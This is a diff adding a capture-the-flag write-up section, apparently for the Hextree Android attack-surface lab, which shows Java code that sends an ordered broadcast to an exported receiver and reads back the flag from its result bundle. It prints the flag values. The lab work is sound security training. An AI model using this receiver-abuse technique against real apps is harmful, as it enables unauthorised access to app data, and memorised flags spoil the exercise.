@@ -782,3 +782,110 @@ The flag was then displayed:
 Flag: HXT{hijacking-broadcast-intent-as91}
 ```
 
+# Flag 17 — Getting the Returned Result
+
+After opening `Flag17Receiver` in **JADX**, I noticed that it checks whether the incoming broadcast is an **ordered broadcast**:
+
+```java
+if (isOrderedBroadcast()) {
+    if (intent.getStringExtra("flag").equals(FlagSecret)) {
+        success(context, FlagSecret);
+        return;
+    }
+}
+```
+
+It also expects an extra named `flag` with the value:
+
+```text
+give-flag-17
+```
+
+So I created an explicit `Intent` targeting `Flag17Receiver` and added the required extra:
+
+```java
+Intent intent = new Intent();
+
+intent.setComponent(new ComponentName(
+        "io.hextree.attacksurface",
+        "io.hextree.attacksurface.receivers.Flag17Receiver"
+));
+
+intent.putExtra("flag", "give-flag-17");
+```
+
+Since the receiver checks `isOrderedBroadcast()`, I used `sendOrderedBroadcast()`:
+
+```java
+sendOrderedBroadcast(
+        intent,
+        null,
+        new BroadcastReceiver() {
+            @Override
+            public void onReceive(Context context, Intent intent) {
+
+                Bundle resultExtras = getResultExtras(false);
+
+                boolean success = false;
+                String flag = null;
+
+                if (resultExtras != null) {
+                    success = resultExtras.getBoolean("success", false);
+                    flag = resultExtras.getString("flag");
+                }
+
+                Toast.makeText(
+                        context,
+                        "\nFlag: " + flag,
+                        Toast.LENGTH_LONG
+                ).show();
+            }
+        },
+        null,
+        0,
+        null,
+        null
+);
+```
+
+I initially set `success` to `false` and `flag` to `null` as default values. After the target receiver processes the broadcast, it creates a result `Bundle` containing the actual values:
+
+```java
+Bundle bundle = new Bundle();
+
+bundle.putBoolean("success", true);
+bundle.putString("flag", flag17Activity.f.appendLog(flag17Activity.flag));
+
+setResult(-1, "Flag 17 Completed", bundle);
+```
+
+I then used:
+
+```java
+Bundle resultExtras = getResultExtras(false);
+```
+
+to retrieve the `Bundle` returned by the receiver. If the Bundle exists, I extract the returned values:
+
+```java
+success = resultExtras.getBoolean("success", false);
+flag = resultExtras.getString("flag");
+```
+
+So the values that started as:
+
+```text
+success = false
+flag = null
+```
+
+are replaced with the values returned by `Flag17Receiver`:
+
+```text
+success = true
+flag = HXT{returned-result-ds82s}
+```
+
+Finally, I displayed the returned flag using a Toast:
+```text
+Flag: HXT{returned-result-ds82s}```
